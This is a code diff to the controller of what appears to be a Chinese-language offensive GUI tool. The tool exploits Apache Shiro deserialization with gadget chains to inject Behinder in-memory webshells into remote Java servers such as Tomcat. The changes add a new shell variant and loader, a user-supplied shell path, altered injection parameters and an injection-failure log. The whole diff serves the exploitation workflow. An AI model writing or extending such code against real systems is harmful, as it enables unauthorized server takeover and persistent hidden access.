@@ -8,6 +8,7 @@ import cn.safe6.core.jobs.BurstJob;
 import cn.safe6.payload.memshell.BehinderLoader;
 import cn.safe6.payload.memshell.BehinderLoader2;
 import cn.safe6.payload.memshell.Loader;
+import cn.safe6.payload.memshell.Loader1;
 import cn.safe6.util.*;
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
@@ -89,6 +90,8 @@ public class Controller {
 
     @FXML
     public ChoiceBox shellType;
+    @FXML
+    public TextField path;
 
 
     ExecutorService pool = Executors.newFixedThreadPool(8);
@@ -150,8 +153,8 @@ public class Controller {
         serverType.setValue("Tomcat7");
         serverType.setItems(serverTypeData);
 
-        ObservableList<String> shellTypeData = FXCollections.observableArrayList("Behinder","Behinder1","Behinder2","Behinder3");
-        shellType.setValue("Behinder");
+        ObservableList<String> shellTypeData = FXCollections.observableArrayList("Behinder","Behinder1","Behinder2","Behinder3","Behinder4");
+        shellType.setValue("Behinder4");
         shellType.setItems(shellTypeData);
 
         ObservableList<String> gadgetData = FXCollections.observableArrayList();
@@ -324,6 +327,12 @@ public class Controller {
             }
 
 
+            String path1 = path.getText();
+            if (path1 == null || path1.trim().equals("")) {
+                Tools.alert("路径错误", "请输入shell路径");
+                return;
+            }
+
             String expName = gadget.getValue().toString();
             String shell = shellType.getValue().toString();
             String url = paramsContext.get("url").toString();
@@ -340,14 +349,15 @@ public class Controller {
             //System.out.println(loaderData);
             //System.out.println("loaderData:"+loaderData.length());
            //byte[] behinderLoaderBytes = Base64.getDecoder().decode(loaderData);
-            byte[] behinderLoaderBytes = Loader.getPayload();
+            //byte[] behinderLoaderBytes = Loader.getPayload();
+            byte[] behinderLoaderBytes = Loader1.getPayload();
+
 
 
             //塞进cc链
             Class clazz = Class.forName(Constants.PAYLOAD_PACK + expName);
             Method mtd = clazz.getMethod("getPayload", byte[].class);
             byte[] payload = (byte[]) mtd.invoke(null, behinderLoaderBytes);
-
 
             Map<String, Object> header = ShiroTool.getShiroHeader((Map<String, Object>) paramsContext.get("header"), rmeValue);
 
@@ -368,13 +378,14 @@ public class Controller {
             String postData="";
             if (params == null) {
                 Class clazz1 = Class.forName(Constants.SHELL_PACK + shell);
-                Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class);
+                Method mtd1 = clazz1.getMethod("getMemBehinder3Payload", String.class,String.class);
                 params = new HashMap<>();
                 //冰蝎内存马需要用到pageContext
-                params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
+                //params.put("c1", GetByteCodeUtil.getEncodeData(PageContext.class));
                 //反射设置密码，取shell
-                String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd));
-                params.put("c2",shellData );
+                String shellData = Base64.getEncoder().encodeToString((byte[])mtd1.invoke(null, passwd,path1));
+                System.out.println(shellData);
+                params.put("c1",shellData );
                 //postData = "c1="+paramsContext.get("PageContext")+"&c2="+shellData;
             }
 
@@ -393,7 +404,7 @@ public class Controller {
             //String ss =HttpTool.post(url,postData,header);
 
             //暂时写死
-            url = url+"?test=ok";
+            //url = url+"?test=ok";
             logUtil.printInfoLog("开始检查注入状态",true);
             Response response = HttpTool.get1(url);
             //String data = response.getData();
@@ -412,6 +423,7 @@ public class Controller {
 
         } catch (Exception e) {
             e.printStackTrace();
+            logUtil.printAbortedLog("内存马注入失败！",true);
         } finally {
             Platform.runLater(() -> inject.setDisable(false));
         }
